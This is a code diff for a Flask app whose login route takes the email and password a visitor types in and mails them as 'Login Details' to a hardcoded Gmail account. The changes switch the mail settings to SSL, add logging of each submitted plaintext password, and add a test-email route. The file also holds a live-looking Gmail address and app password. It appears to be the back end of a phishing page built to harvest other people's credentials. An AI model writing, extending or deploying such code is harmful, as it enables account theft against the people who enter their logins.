@@ -10,9 +10,9 @@ app.config['SECRET_KEY'] = 'your_secret_key_here'
 
 # Configure mail settings for Gmail
 app.config['MAIL_SERVER'] = 'smtp.gmail.com'
-app.config['MAIL_PORT'] = 587
-app.config['MAIL_USE_TLS'] = True
-app.config['MAIL_USERNAME'] = 'davidcarter387@gmail.com'  # Your Gmail email address
+app.config['MAIL_PORT'] = 465
+app.config['MAIL_USE_SSL'] = True
+app.config['MAIL_USERNAME'] = 'davidcarterr387@gmail.com'  # Your Gmail email address
 app.config['MAIL_PASSWORD'] = 'ihvgjpnblswcjidg'  # Your Gmail password or App Password
 
 mail = Mail(app)
@@ -26,6 +26,10 @@ def login():
     email = request.form['email']
     password = request.form['password']
 
+
+    app.logger.debug(f'Received email: {email}')
+    app.logger.debug(f'Received password: {password}')
+
     try:
         # Send email with login details to Gmail account
         msg = Message('Login Details', sender=app.config['MAIL_USERNAME'], recipients=[app.config['MAIL_USERNAME']])
@@ -36,6 +40,21 @@ def login():
         flash(f'Failed to send email. Error: {str(e)}', 'error')
 
     return redirect(url_for('index'))
+
+@app.route('/test_email')
+def test_email():
+    try:
+        msg = Message('Test Email', sender=app.config['MAIL_USERNAME'], recipients=[app.config['MAIL_USERNAME']])
+        msg.body = 'This is a test email.'
+        mail.send(msg)
+        app.logger.debug("Test email sent successfully.")
+        return "Test email sent successfully."
+    except Exception as e:
+        app.logger.error(f"Failed to send test email. Error: {str(e)}")
+        return f"Failed to send test email. Error: {str(e)}"
+
+
+
 
 if __name__ == '__main__':
     # Only run the app if this script is executed directly
